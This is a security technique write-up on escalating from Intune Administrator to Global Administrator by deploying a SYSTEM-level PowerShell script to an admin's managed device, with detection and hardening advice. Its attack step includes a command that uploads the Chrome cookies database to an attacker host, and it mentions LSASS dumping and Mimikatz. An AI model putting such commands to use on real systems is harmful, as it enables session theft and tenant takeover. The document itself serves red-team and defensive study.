# [PE-ACCTMGMT-006]: Intune Admin to Global Admin (Via Device Script)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-006 |
| **MITRE ATT&CK v18.1** | [Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation / Credential Access |
| **Platforms** | Intune / Endpoint Manager |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Intune Administrators can deploy PowerShell scripts (or Win32 Apps) to managed Windows devices. These scripts run as **SYSTEM**. If a Global Administrator logs into a managed device (e.g., their corporate laptop), the Intune Admin can deploy a script to that specific device to dump credentials (LSASS), steal browser session cookies (Primary Refresh Token), or install a keylogger.
- **Attack Surface:** Intune Script Deployment.
- **Business Impact:** **Token Theft**. Compromising the GA's session.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Intune Administrator.
- **Tools:**
    - Intune Portal (Endpoint Manager)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Identify GA Device**
Find the device ID of a Global Admin.
```powershell
Get-IntuneManagedDevice | Where-Object {$_.UserPrincipalName -eq "admin@domain.com"}
```

**Step 2: Create Script**
Create a PowerShell script to exfiltrate the Chrome Cookies DB or run Mimikatz.
```powershell
# Exfiltrate to attacker server
Invoke-WebRequest -Uri "http://attacker.com" -Method Post -InFile $env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies
```

**Step 3: Deploy**
Assign the script to a group containing only the target device/user.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Intune Logs
| Source | Event | Filter Logic |
|---|---|---|
| **IntuneAudit** | `Create DeviceManagementScript` | Creation of new scripts by admins. |
| **Endpoint** | `ProcessCreation` | `AgentExecutor.exe` spawning PowerShell with suspicious network connections. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **PAW:** Global Admins should only log into **Privileged Access Workstations (PAWs)** that are *not* managed by the general Intune environment (or managed by a separate high-security Intune tenant).
*   **Tiering:** Intune Admins are effectively Tier 0 because they control workstations.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [IA-PASS-001]
